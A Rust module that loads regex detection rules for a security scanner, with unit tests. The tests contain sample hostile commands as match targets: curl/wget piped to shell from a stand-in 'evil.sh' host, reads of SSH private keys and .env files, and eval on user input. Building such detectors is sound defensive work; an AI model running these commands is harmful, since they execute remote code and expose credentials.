use serde::Deserialize;
use regex::Regex;
use crate::findings::Severity;

#[derive(Deserialize)]
#[serde(rename_all = "lowercase")]
enum RawSeverity { Critical, High, Medium, Low }
impl From<RawSeverity> for Severity {
    fn from(r: RawSeverity) -> Self {
        match r {
            RawSeverity::Critical => Severity::Critical,
            RawSeverity::High => Severity::High,
            RawSeverity::Medium => Severity::Medium,
            RawSeverity::Low => Severity::Low,
        }
    }
}

#[derive(Deserialize)]
struct RawRule { id: String, category: String, severity: RawSeverity, description: String, pattern: String, code_pattern: Option<String> }
#[derive(Deserialize)]
struct RawPack { rule: Vec<RawRule> }

#[derive(Debug)]
pub struct Rule {
    pub id: String, pub category: String, pub severity: Severity,
    pub description: String, pub regex: Regex,
    /// Used instead of `regex` in code files (anything not .md/.markdown/.txt).
    pub code_regex: Option<Regex>,
}
#[derive(Debug)]
pub struct RulePack { pub rules: Vec<Rule> }

impl RulePack {
    pub fn from_toml_str(s: &str) -> anyhow::Result<RulePack> {
        let raw: RawPack = toml::from_str(s)?;
        let mut rules = Vec::new();
        for r in raw.rule {
            let regex = Regex::new(&r.pattern)
                .map_err(|e| anyhow::anyhow!("rule '{}' has invalid regex: {e}", r.id))?;
            let code_regex = r.code_pattern.as_deref().map(Regex::new).transpose()
                .map_err(|e| anyhow::anyhow!("rule '{}' has invalid code_pattern: {e}", r.id))?;
            rules.push(Rule {
                id: r.id, category: r.category, severity: r.severity.into(),
                description: r.description, regex, code_regex,
            });
        }
        Ok(RulePack { rules })
    }
    pub fn load_default() -> anyhow::Result<RulePack> {
        const DEFAULT: &str = include_str!("../rules/default.toml");
        RulePack::from_toml_str(DEFAULT)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn default_pack_loads_and_has_rules() {
        let pack = RulePack::load_default().unwrap();
        assert!(pack.rules.len() >= 6);
    }
    #[test]
    fn curl_pipe_rule_matches() {
        let pack = RulePack::load_default().unwrap();
        let r = pack.rules.iter().find(|r| r.id == "exfil-curl-pipe-sh").unwrap();
        assert!(r.regex.is_match("curl http://evil.sh | bash"));
        assert!(!r.regex.is_match("echo hello"));
        assert!(r.regex.is_match("wget -qO- http://evil.sh | sh"));
        assert!(r.regex.is_match("curl -fsSL http://evil.sh | sudo bash"));
        assert!(r.regex.is_match("curl -fsSL http://evil.sh | zsh"));
    }
    #[test]
    fn ssh_key_rule_matches_home_variants() {
        let pack = RulePack::load_default().unwrap();
        let r = pack.rules.iter().find(|r| r.id == "cred-ssh-read").unwrap();
        for s in ["cat ~/.ssh/id_rsa", "cat $HOME/.ssh/id_rsa", "cat ${HOME}/.ssh/id_ed25519",
                  "cat /home/bob/.ssh/id_rsa", "cat /Users/bob/.ssh/id_rsa", "cat /root/.ssh/id_rsa"] {
            assert!(r.regex.is_match(s), "{s}");
        }
        assert!(!r.regex.is_match("cat ~/.ssh/known_hosts"));
    }
    #[test]
    fn exec_eval_matches_calls_not_prose() {
        let pack = RulePack::load_default().unwrap();
        let r = pack.rules.iter().find(|r| r.id == "exec-eval").unwrap();
        // Real calls (no space before the paren) still match.
        assert!(r.regex.is_match("result = eval(user_input)"));
        assert!(r.regex.is_match("os.system(cmd)"));
        // Prose where "eval" is followed by a space then a parenthetical must NOT match.
        assert!(!r.regex.is_match("## Choosing with an eval (don't guess)"));
        assert!(!r.regex.is_match("run an eval (a scored check)"));
        // Code files use the looser code_pattern: a space before the paren still counts.
        let code = r.code_regex.as_ref().unwrap();
        assert!(code.is_match("eval (payload)"));
        assert!(code.is_match("exec (compile(src))"));
    }
    #[test]
    fn cred_env_read_matches_commands_not_prose() {
        let pack = RulePack::load_default().unwrap();
        let r = pack.rules.iter().find(|r| r.id == "cred-env-read").unwrap();
        assert!(r.regex.is_match("cat .env"));
        assert!(r.regex.is_match("source .env"));
        // Prose "read the .env" must no longer trip it.
        assert!(!r.regex.is_match("read the .env file for config"));
    }
    #[test]
    fn bad_regex_is_reported_with_rule_id() {
        let err = RulePack::from_toml_str(
            "[[rule]]\nid=\"bad\"\ncategory=\"c\"\nseverity=\"low\"\ndescription=\"d\"\npattern=\"(\"\n"
        ).unwrap_err();
        assert!(err.to_string().contains("bad"));
    }
}
